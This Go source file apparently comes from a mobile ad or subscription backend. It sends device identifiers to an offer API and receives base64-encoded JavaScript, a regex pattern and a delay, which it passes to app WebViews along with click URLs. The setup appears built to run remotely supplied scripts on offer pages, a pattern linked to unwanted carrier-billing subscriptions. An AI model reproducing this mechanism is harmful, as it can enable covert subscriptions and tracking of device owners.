package subscription

import (
	"fmt"
	"math/rand"
	"net/url"
	"strings"

	"http_context"
)

type InfoMobiResponse struct {
	Msg      string `json:"msg"`
	Status   int    `json:"status"`
	OfferId  int    `json:"offerid"`
	OfferUrl string `json:"offerUrl"`
	JS       *struct {
		R    string `json:"r"` // js对应的正则模式字符串
		S    string `json:"s"` // js脚本，base64编码
		JsId int    `json:"jsid"`
		Wait int    `json:"w"` // 执行js前休眠的时间
	} `json:"js"`

	ClickId   string `json:"-"`
	ClickArgs string `json:"-"`
}

func (i *InfoMobiResponse) genClickUrl() string {
	if strings.Contains(i.OfferUrl, "?") {
		return i.OfferUrl + "&clickid=" + i.ClickId
	}
	return i.OfferUrl + "?clickid=" + i.ClickId
}

func (i *InfoMobiResponse) ToSubscription(ch string, ctx *http_context.Context) *Subscription {
	sub := &Subscription{
		UseWebView: 1,
		Report:     fmt.Sprintf(gSubControl.reportUrl, ch, i.OfferId, i.ClickArgs),
		ClkUrl:     i.genClickUrl(),
		ImpUrl:     "",
		Js:         []string{i.JS.S},
	}
	return sub
}

func GetMoreInfoMobiJs(ctx *http_context.Context) ([]*Subscription, string) {
	//	ifmUrl := "http://api.infomobi.me/api/s2s/fetch/cloudmobi"
	subs := make([]*Subscription, 0, 1)
	clickId, clickArgs := getClickId("ifm", ctx)
	redirectUrl := ""

	parameters := make([]string, 0, 5)
	parameters = append(parameters, fmt.Sprintf("p=$$$vc$$$-%s-%s", ctx.SlotId, ctx.PkgName))
	parameters = append(parameters, "i="+ctx.IP)
	parameters = append(parameters, "u="+url.QueryEscape(ctx.UA))
	parameters = append(parameters, "androidId="+ctx.Aid)
	parameters = append(parameters, "gaid="+ctx.Gaid)

	parametersStr := strings.Join(parameters, "&")

	ifmUrl := gSubControl.infomobiUrl + "?" + parametersStr
	header := make(map[string]string, 1)
	header["Accept-Encoding"] = "gzip, deflate"

	var ifmResp InfoMobiResponse
	if err := HttpGet(header, 700, ifmUrl, &ifmResp); err != nil {
		ctx.L.Println("GetMoreInfoMobiJs err: ", err, " api: ", ifmUrl)
		return subs, redirectUrl
	}

	if ifmResp.Status != 0 {
		if rand.Intn(100) == 1 {
			ctx.L.Println("GetMoreInfoMobiJs status not 0, status: ", ifmResp.Status, " msg: ", ifmResp.Msg)
		}
		return subs, redirectUrl
	}

	if ifmResp.JS == nil || len(ifmResp.JS.S) == 0 {
		ctx.L.Println("GetMoreInfoMobiJs no js, js: ", ifmResp.JS)
		return subs, redirectUrl
	}
	ifmResp.ClickId = clickId
	ifmResp.ClickArgs = clickArgs

	return append(subs, ifmResp.ToSubscription("ifm", ctx)), redirectUrl
}
